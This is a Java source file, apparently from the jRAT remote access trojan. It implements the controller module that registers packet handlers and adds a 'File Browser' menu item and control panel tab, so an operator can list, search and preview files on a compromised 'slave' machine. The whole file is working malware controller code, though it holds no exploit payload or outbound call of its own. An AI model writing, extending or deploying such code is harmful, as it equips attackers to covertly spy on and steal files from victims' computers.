package jrat.module.fs;

import jrat.api.ClientEventListener;
import jrat.api.ControllerModule;
import jrat.api.Resources;
import jrat.api.ui.ClientMenu;
import jrat.api.ui.ClientMenuItem;
import jrat.api.ui.ControlPanel;
import jrat.api.ui.ControlPanelTab;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.fs.packets.*;
import jrat.module.fs.ui.PanelFileSystem;

public class FileSystemControllerModule extends ControllerModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 34, Packet34CustomDirectory.class);
        IncomingPackets.register((short) 22, Packet22ListFiles.class);
        IncomingPackets.register((short) 37, Packet37SearchResult.class);
        IncomingPackets.register((short) 59, Packet59ThumbnailPreview.class);
        IncomingPackets.register((short) 42, Packet42PreviewFile.class);
        IncomingPackets.register((short) 43, Packet43PreviewImage.class);
        IncomingPackets.register((short) 45, Packet45ArchivePreview.class);

        menuItems.add(new ClientMenuItem(ClientMenu.Category.QUICK_OPEN, "File Browser", Resources.getIcon("folder-tree"), new ClientEventListener() {
            @Override
            public void emit(AbstractSlave slave) {
                new PanelFileSystem((Slave) slave).displayFrame();
            }
        }));

        controlPanelItems.add(new ControlPanelTab(ControlPanel.Category.SYSTEM, "File Browser", Resources.getIcon("folder-tree"), PanelFileSystem.class));
    }
}
